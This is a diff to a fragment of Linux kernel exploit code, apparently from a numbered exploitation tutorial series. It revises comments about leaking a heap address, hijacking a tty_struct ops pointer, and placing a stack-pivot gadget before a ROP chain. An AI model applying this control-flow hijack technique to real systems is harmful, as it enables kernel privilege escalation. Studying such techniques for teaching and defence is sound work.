@@ -86,13 +86,14 @@ int main() {
   g_buf = *(unsigned long*)&buf[0x438] - 0x438;
   printf("[+] g_buf = 0x%016lx\n", g_buf);
 
-  // When updating buf[0x418] = g_buf (as in src/03.stack_pivot/stack_pivot.c),
-  // the RIP is taken from g_buf[12]. Since there is not enough space to fit
-  // the rop chain (in 12 bytes), we will set tty_struct so that the RIP is taken
-  // from tty_struct[12] instead (buf[0x400+12]), freeing g_buf[12] for the rop
+  // When setting the ->ops member of the victim struct (buf[0x418]) to g_buf
+  // (as in src/03.stack_pivot/stack_pivot.c), the RIP is taken from g_buf[12].
+  // Since there is not enough space to fit the rop chain in 12 bytes, we will
+  // set ->ops to point to the tty_struct memory instead (buf[0x400]), so the
+  // RIP will be taken from buf[0x400+12], and releasing g_buf[12] for the rop
   // chain.
   unsigned long *p = (unsigned long*)&buf[0x400];
-  p[12] = rop_push_rdx_mov_ebp_415bffd9h_pop_rsp_r13_rbp;
+  p[12] = rop_push_rdx_mov_ebp_415bffd9h_pop_rsp_r13_rbp; // goal: mov rsp, rdx; ret;
   *(unsigned long*)&buf[0x418] = g_buf + 0x400;
 
   // ROP chain
